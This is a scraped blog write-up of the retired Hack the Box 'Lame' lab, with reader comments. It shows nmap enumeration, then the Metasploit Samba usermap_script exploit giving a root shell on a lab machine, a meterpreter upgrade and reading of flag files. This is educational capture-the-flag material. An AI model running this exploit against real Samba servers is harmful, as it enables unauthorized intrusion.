@@ -1,0 +1,255 @@
+
+								
+																		Hack the Box Challenge: Lame Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 23, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Lame” which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Lame lab.
+Level: Beginners           
+Task: find user.txt and root.txt file in the victim’s machine.
+Let’s begin the Game!!
+Since these labs are online available therefore they have static IP and IP of Lame is 10.10.10.3 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.3
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.3
+					
+				
+			
+		
+
+From given below image, you can observe that we found so many open ports such as 21 for ftp, 22 for ssh, 139 and 445 for samba service and also got hit OS platform can be Unix or Linux.
+
+From nmap result we saw samba service smbd 3.x is running in victim’s machine therefore next I search for any exploit related to this service in Google.
+Gratefully Google gave me hint in their 2nd link of exploit DB.
+
+Then I run the msfconsole command in terminal and load Metasploit framework for using Samba 3.0.20 &lt; 3.0.25rc3 – ‘Username’ map script’ Command Execution module for exploiting target machine.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/samba/usermap_script
+msf exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
+msf exploit(multi/samba/usermap_script) &gt; exploit
+			
+				
+					
+				
+					123
+				
+						use exploit/multi/samba/usermap_scriptmsf exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3msf exploit(multi/samba/usermap_script) &gt; exploit
+					
+				
+			
+		
+
+Terrific!! I have got unauthorized access of victims command shell through session 1 as shown in below image.
+I had updated command shell into the meterpreter shell by executing the following command.
+
+		
+		
+			
+			
+			
+			
+sessions -u 1
+			
+				
+					
+				
+					1
+				
+						sessions -u 1
+					
+				
+			
+		
+
+
+Inside path: /home/makis I found the user.txt file and used cat “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd makis
+ls
+cat user.txt
+			
+				
+					
+				
+					12345
+				
+						cd /homelscd makislscat user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Inside path: /root I found the root.txt file and used cat “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully
+It will be a very stress-free challenge for that candidate who has knowledge little know vulnerability analysis.
+Happy Hacking!! 
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								ms3xploit January 16, 2019 at 10:40 am							
+							
+							
+														
+							
+								I’m not able to scan the target. Please help me.
+It says host seems to be down. I tried with -Pn and also didn’t get the output.
+Please help
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								AlbinoHacker January 17, 2019 at 2:25 pm							
+							
+							
+														
+							
+								I had the same issues try -Pn -sV and it worked for me.
+Although now running msfconsole I get the following error: Exploit completed, but no session was created.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
